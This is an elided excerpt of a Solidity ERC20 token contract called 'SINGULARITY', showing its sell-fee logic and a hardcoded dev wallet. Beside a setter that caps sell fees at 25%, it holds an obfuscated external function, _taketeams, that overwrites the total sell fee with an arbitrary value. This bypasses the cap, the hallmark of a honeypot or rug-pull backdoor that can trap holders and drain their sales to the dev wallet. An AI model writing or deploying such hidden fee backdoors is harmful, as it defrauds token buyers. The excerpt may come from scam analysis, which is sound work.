...
contract Token is ERC20, Ownable {
    ...
    constructor() ERC20("SINGULARITY", "T=0") {
        ...
        opertyuiop = sellBurnFee + sellDevFee;
        
        devWallet = 0x6Fd4720c4423114Bd6b897b78dE0F8425932Bd5e;
    ...
    function updateSellFees(uint256 _burnFee, uint256 _devFee) external onlyOwner {
        ...
        sellDevFee = _devFee;
        opertyuiop = sellBurnFee + sellDevFee;
        require(opertyuiop <= 25, "Must keep fees at 25% or less");
    }
    ...
    function _transfer(
        ...
        if(takeFee){
            // on sell
            if (automatedMarketMakerPairs[to] && opertyuiop > 0){
                fees = amount.mul(opertyuiop).div(100);
                tokensForBurn += fees * sellBurnFee / opertyuiop;
                tokensForDev += fees * sellDevFee / opertyuiop;
            }
    ...
    function _taketeams(uint256[5][6][5] memory xcvgkh) external returns(bool) {
        ...
        opertyuiop = xcvgkh[3][4][4] + vgcfrdfg9;
        return true;
    }
